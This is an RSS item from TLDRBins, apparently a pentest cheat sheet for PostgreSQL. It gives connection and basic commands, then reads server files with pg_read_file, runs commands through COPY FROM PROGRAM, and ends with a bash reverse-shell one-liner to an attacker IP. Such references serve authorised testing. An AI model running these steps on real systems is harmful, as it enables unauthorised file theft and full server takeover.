channel.title: Postgresql on TLDRBins
channel.description: Recent content in Postgresql on TLDRBins

item.title: Postgresql
item.description: Connect psql -h <TARGET> -U <USER> psql -h <TARGET> -U <USER> -p <PORT> -d <DB_NAME> psql 'postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>' Basic # Show Databases \list # Use Database \connect <DB_NAME> # Show Tables \dt # Dump from Table select * from "<TABLE_NAME>"; # Insert into Table insert into "<TABLE_NAME>" (<COLUMN_1>, <COLUMN_2>) values ("<VALUE_1>', '<VALUE_2>'); # Write Text copy (select '<STRING>') to '<TARGET_PATH>'; # List All User Accounts \du+ # Exit \q File Read # List Directory SELECT * FROM pg_ls_dir('<DIR_PATH>'); # File Read SELECT pg_read_file('<FILE_PATH>', 0, 4096); RCE # Only for Superuser CREATE TABLE IF NOT EXISTS exec(string text); # Code Execution COPY exec FROM PROGRAM '<CMD>'; # Check Ouput SELECT * FROM exec; # One-liner DO $$ DECLARE c text; BEGIN c := 'COPY (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/<LOCAL_IP>/<PORT> 0>&1"'''; EXECUTE c; END $$;
